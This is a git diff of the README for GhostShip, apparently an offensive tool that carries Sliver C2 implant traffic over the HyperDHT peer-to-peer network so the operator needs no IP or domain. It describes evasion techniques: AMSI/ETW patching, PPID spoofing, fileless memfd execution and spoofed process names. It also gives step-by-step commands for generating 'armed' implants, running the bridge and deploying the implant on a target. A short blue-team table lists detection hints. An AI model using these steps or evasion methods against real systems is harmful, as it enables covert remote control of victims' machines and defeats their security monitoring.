@@ -4,207 +4,136 @@
 ### v1.0.0-alpha
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Status: Alpha](https://img.shields.io/badge/Status-Alpha-red.svg)](#)
+[![Status: Proof of Concept](https://img.shields.io/badge/Status-PoC-orange.svg)](#)
 
 ---
 
 ## Overview
 
-**GhostShip** is a peer-to-peer (P2P) transport layer for [Sliver C2](https://github.com/BishopFox/sliver) that routes implant traffic through the [HyperDHT](https://github.com/holepunchto/hyperdht) network.
+**GhostShip** is a peer-to-peer (P2P) communication layer designed to bridge [Sliver C2](https://github.com/BishopFox/sliver) implants and servers through the [HyperDHT](https://github.com/holepunchto/hyperdht) network.
 
-**Core concept:** The operator runs a bridge that exposes Sliver C2 via P2P. The implant connects to this bridge using only a connection key (`hs://...`). No public IPs, no domains, no traditional infrastructure.
+By utilizing [Holesail](https://github.com/holesail/holesail) technology, GhostShip allows C2 traffic to traverse the internet via a decentralized DHT, effectively bypassing the need for public IPs, static domains, or traditional VPS infrastructure.
+
+> [!IMPORTANT]
+> **This is a Proof of Concept (PoC)** — GhostShip was developed to explore the feasibility of P2P-based C2 communication. The current implementation relies on workarounds (bridging Sliver rather than native integration) to validate the concept. If proven effective, the recommended path forward is developing a purpose-built C2 with native P2P transport, rather than maintaining a bridge architecture.
 
 ---
 
-## Project Status
+## Key Features
 
-| Component | Status | Notes |
-|-----------|--------|-------|
-| Linux Implant | ✅ Working | LD_PRELOAD stealth, memfd execution |
-| Windows Implant | ✅ Working | Named Pipes, PPID Spoofing, AMSI/ETW patch |
-| Bridge (Operator) | ✅ Working | Go and Node.js implementations |
-| CI/CD | ✅ Working | Auto-builds armed binaries on release |
-| Documentation | 🟡 Partial | Basic usage documented |
+- **P2P Transport**: Routes mTLS Sliver traffic over HyperDHT. No direct connection between the target and the operator's IP.
+- **Universal Loader**: A Go-based manager for both **Linux** and **Windows** implants.
+- **Stealth Residency**:
+  - **Linux**: Uses `memfd_create` to execute the node runtime and payload directly from memory.
+  - **Windows**: Implements **PPID Spoofing** and basic **AMSI/ETW Patching** to hinder local detection.
+- **In-Memory IPC**: Communication between the P2P client and the Sliver payload happens via internal pipes (`socketpair` on Linux, `Named Pipes` on Windows), avoiding local port bindings.
 
 ---
 
 ## Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                              TARGET MACHINE                                  │
-│                                                                             │
-│  ┌─────────────┐    socketpair/    ┌─────────────┐                         │
-│  │   Sliver    │    named pipe     │   Node.js   │                         │
-│  │   Payload   │◄──────────────────►│   Client    │                         │
-│  │  (mTLS)     │   (no TCP port)   │  (HyperDHT) │                         │
-│  └─────────────┘                    └──────┬──────┘                         │
-│        ▲                                   │                                │
-│        │ LD_PRELOAD hook (Linux)           │ UDP/P2P                        │
-│        │ or Named Pipe (Windows)           │                                │
-└────────┼───────────────────────────────────┼────────────────────────────────┘
-         │                                   │
-         │                                   ▼
-         │                          ┌───────────────┐
-         │                          │   HyperDHT    │
-         │                          │   Network     │
-         │                          └───────┬───────┘
-         │                                  │
-         │                                  ▼
-┌────────┼──────────────────────────────────────────────────────────────────┐
-│        │                     OPERATOR MACHINE                              │
-│        │                                                                   │
-│        │              ┌─────────────┐         ┌─────────────┐             │
-│        │              │   Bridge    │         │   Sliver    │             │
-│        └──────────────│  (HyperDHT) │◄───────►│   Server    │             │
-│                       │             │  TCP    │  (mTLS)     │             │
-│                       └─────────────┘ :8888   └─────────────┘             │
-│                                                                            │
-│                       Connection Key: hs://abc123...                       │
-└────────────────────────────────────────────────────────────────────────────┘
+                                    HyperDHT Network
+                                          |
+                                          | UDP/P2P
+                                          |
+        +-----------------------------+   |   +-----------------------------+
+        |       TARGET MACHINE        |   |   |      OPERATOR MACHINE       |
+        |                             |   |   |                             |
+        |  +--------+    +---------+  |   |   |  +---------+    +--------+  |
+        |  | Sliver |<-->| Node.js |<-|---+---|->| Bridge  |<-->| Sliver |  |
+        |  | Payload|    | Client  |  |       |  |(HyperDHT)|   | Server |  |
+        |  +--------+    +---------+  |       |  +---------+    +--------+  |
+        |       ^              ^      |       |       ^              ^      |
+        |       |              |      |       |       |              |      |
+        |   socketpair     HyperDHT   |       |   HyperDHT     TCP:8888     |
+        |   (Linux)        connect    |       |   listen       (mTLS)      |
+        |   Named Pipe                |       |                            |
+        |   (Windows)                 |       |  Connection Key:           |
+        |                             |       |  hs://abc123...            |
+        +-----------------------------+       +-----------------------------+
 ```
 
----
-
-## Strengths
-
-### What GhostShip Does Well
-
-1. **Zero Infrastructure**
-   - No public IP required for operator
-   - No domain registration
-   - No VPS to maintain or get seized
-   - Connection key is the only "address"
-
-2. **Stealth IPC (Linux)**
-   - LD_PRELOAD hook intercepts Sliver's TCP `connect()`
-   - Redirects to Unix socketpair
-   - **No listening TCP ports** - `netstat`/`ss` shows nothing
-   - All traffic flows through anonymous pipe
-
-3. **Stealth IPC (Windows)**
-   - Sliver uses native Named Pipe transport
-   - No TCP listener on target
-   - PPID Spoofing (appears as child of svchost.exe)
-   - AMSI/ETW patching (blinds local telemetry)
-
-4. **Fileless Execution (Linux)**
-   - Node.js and Sliver payload loaded via `memfd_create`
-   - Executed from memory, not disk
-   - Process names spoofed as `[kworker/...]`
-
-5. **Full Sliver Features**
-   - All Sliver capabilities work: shell, upload, download, pivoting, etc.
-   - No custom protocol limitations
-   - Maintained by BishopFox
+**Data Flow:**
+1. Operator starts Sliver server with mTLS listener on port 8888
+2. Bridge connects to Sliver and exposes it via HyperDHT, generating a connection key
+3. Implant connects to HyperDHT using the connection key
+4. Sliver payload communicates through internal IPC (socketpair/Named Pipe) to the Node.js client
+5. Node.js client tunnels traffic over P2P to the bridge
+6. Bridge forwards traffic to local Sliver server
 
 ---
 
-## Limitations
+## Strengths & Limitations
 
-### What GhostShip Does NOT Hide
+| Category | Strengths | Limitations |
+|----------|-----------|-------------|
+| **Infrastructure** | No public IP, domain, or VPS required. Connection key is the only "address" | Bridge must be running for implant connectivity |
+| **Network Stealth** | No direct IP connection between target and operator | UDP/DHT traffic is visible to network monitoring. Traffic patterns may be flagged by DPI/ML detection |
+| **Local Stealth (Linux)** | LD_PRELOAD hook redirects TCP to socketpair. No listening ports visible via `netstat`/`ss`. Fileless execution via `memfd_create`. Process names spoofed as `[kworker/...]` | Processes visible in `ps`. `/proc` filesystem exposes process info. Memory forensics can find payloads |
+| **Local Stealth (Windows)** | Named Pipe transport (no TCP listener). PPID Spoofing (child of svchost.exe). AMSI/ETW patching blinds local telemetry | Not a rootkit. No kernel-level hiding. EDR signatures will eventually detect |
+| **Capability** | Full Sliver C2 feature set: shell, upload, download, pivoting, etc. | Binary size ~70-100MB due to embedded Node.js runtime |
+| **Architecture** | Validates P2P C2 feasibility. Works across NAT without port forwarding | Bridge pattern introduces complexity. Native P2P C2 would be more robust |
 
-1. **Network Traffic is Visible**
-   - UDP traffic to DHT peers is visible to network monitoring
-   - Traffic patterns may be anomalous compared to normal user activity
-   - DPI/ML-based detection could flag DHT traffic
+---
 
-2. **Processes are Visible**
-   - `ps aux` shows running processes (even with spoofed names)
-   - `/proc` filesystem exposes process information
-   - Memory forensics can find payloads
+## Security Considerations
 
-3. **Not APT-Grade**
-   - No kernel-level hiding
-   - No rootkit capabilities
-   - No anti-forensics beyond basic cleanup
-   - Signatures will eventually be detected by EDR
-
-4. **Operational Constraints**
-   - Connection key must be delivered to target securely
-   - If key is compromised, traffic can potentially be intercepted
-   - Bridge must be running for implant to connect
-
-5. **Binary Size**
-   - ~70-100MB due to embedded Node.js runtime
-   - Not suitable for size-constrained scenarios
+| Aspect | For Red Teams | For Blue Teams |
+|--------|---------------|----------------|
+| **Key Management** | Rotate connection keys between operations. Treat keys as credentials | Intercepted keys may allow traffic decryption |
+| **Network Detection** | Test DHT traffic against target's security stack before deployment. Consider traffic timing to avoid pattern detection | Monitor for unusual UDP traffic patterns (DHT bootstrap nodes). Alert on HyperDHT protocol signatures |
+| **Process Detection** | Verify process spoofing against target's EDR | Look for processes with spoofed names (`[kworker/...]`). Check for `LD_PRELOAD` in `/proc/<pid>/environ` |
+| **Windows Detection** | Test AMSI/ETW patches against current AV/EDR | Monitor named pipe creation (`\\.\pipe\gspipe`). Detect AMSI/ETW tampering via integrity checks |
+| **Memory Forensics** | Payload resides in memory, not disk | Memory scanning can reveal Sliver signatures. Monitor `memfd_create` syscalls |
 
 ---
 
 ## Quick Start
 
-### 1. Operator Setup
-
+### 1. Prepare Sliver (Operator)
+Start your Sliver server and enable an mTLS listener:
 ```bash
-# Terminal 1: Start Sliver C2
-sliver-server
 sliver > mtls --lport 8888
-
-# Terminal 2: Start GhostShip Bridge
-./bridge-linux --port 8888
-
-# Output:
-# ======================================================================
-# GHOSTSHIP BRIDGE (v1.0.0) - OPERATOR SIDE
-# ======================================================================
-# Sliver Port:      8888
-# Connection Key:   hs://a1b2c3d4e5f6...
-# ======================================================================
 ```
 
-### 2. Deploy on Target
+### 2. Start the Operator Bridge
+The bridge connects your local Sliver listener to the DHT.
 
 ```bash
-# Linux
-./ghostship-linux --connect "hs://a1b2c3d4e5f6..."
-
-# Windows (PowerShell)
-.\ghostship-windows.exe --connect "hs://a1b2c3d4e5f6..."
+./bridge-linux --port 8888
+# Output: Connection Key: hs://<public_key>
 ```
 
-### 3. Receive Session
+### 3. Deploy the Implant (Target)
+Run the GhostShip loader on the target, providing the connection key generated by your bridge.
 
+**Linux:**
+```bash
+chmod +x ghostship-linux
+./ghostship-linux --connect "hs://<public_key>"
 ```
-sliver > sessions
 
- ID   Transport   Remote Address   Hostname   Username   OS/Arch
- ==   =========   ==============   ========   ========   =======
- 1    mtls        127.0.0.1:0      target     user       linux/amd64
-
-sliver > use 1
-sliver (OBJECTIVE_HORSE) > whoami
+**Windows:**
+```powershell
+.\ghostship-windows.exe --connect "hs://<public_key>"
 ```
 
 ---
 
-## Building from Source
+## Arming the Implant
 
-### Prerequisites
+The CI/CD pipeline automatically builds armed binaries on release. For manual builds:
 
-- Go 1.21+
-- Node.js 20+ (for bridge development)
-- GCC (for Linux LD_PRELOAD hook)
-
-### Manual Build
-
-```bash
-# 1. Download Node.js binary for target platform
-# 2. Generate Sliver implant
-# 3. Bundle assets
-./bundle.sh /path/to/node /path/to/sliver-implant
-
-# 4. Build
-make build-linux   # or make build-windows
-```
-
-### CI/CD
-
-The GitHub Actions workflow automatically:
-1. Downloads Node.js for Linux and Windows
-2. Generates Sliver implants with correct transport config
-3. Compiles LD_PRELOAD hook (Linux)
-4. Bundles everything into armed binaries
-5. Creates release on tag push
+1. **Obtain a Node.js binary** compatible with your target platform
+2. **Generate your Sliver implant**:
+   - Linux: `generate --mtls 127.0.0.1:8888 --os linux --arch amd64`
+   - Windows: `generate --named-pipe '\\\\.\\pipe\\gspipe' --os windows --arch amd64`
+3. **Bundle and Build:**
+   ```bash
+   ./bundle.sh /path/to/node /path/to/implant
+   make build-linux   # or make build-windows
+   ```
 
 ---
 
@@ -215,9 +144,8 @@ ghostship/
 ├── implant/
 │   ├── main.go                 # Entry point
 │   └── core/
-│       ├── loader_linux.go     # Linux loader (memfd, LD_PRELOAD)
-│       ├── loader_windows.go   # Windows loader (PPID spoof, AMSI)
-│       ├── loader.go           # Asset extraction
+│       ├── loader_linux.go     # Linux: memfd, socketpair, LD_PRELOAD
+│       ├── loader_windows.go   # Windows: PPID spoof, AMSI/ETW, Named Pipes
 │       └── assets/
 │           ├── client.js       # P2P client (Linux)
 │           ├── client-windows.js
@@ -233,40 +161,15 @@ ghostship/
 
 ---
 
-## Security Considerations
-
-### For Red Teams
-
-- Rotate connection keys between operations
-- Monitor for DHT traffic signatures in target environment
-- Consider traffic timing to avoid pattern detection
-- Test against target's EDR before deployment
-
-### For Blue Teams
-
-- Monitor for unusual UDP traffic patterns (DHT)
-- Look for processes with spoofed names (`[kworker/...]`)
-- Check for LD_PRELOAD in process environment
-- Monitor named pipe creation on Windows
-- Memory scanning for Sliver signatures
-
----
-
-## Roadmap
-
-- [ ] Traffic obfuscation (domain fronting for DHT)
-- [ ] Beacon mode (reduce persistent connection)
-- [ ] Multi-operator support
-- [ ] Connection key rotation
-- [ ] Smaller binary size (custom Node.js build)
-
----
-
 ## Disclaimer
 
-This project is for **authorized security research and penetration testing only**.
+This project is for **authorized security research and penetration testing only**. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.
 
-The authors are not responsible for misuse. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.
+---
+
+## Author
+
+**bitsalv**
 
 ---
 
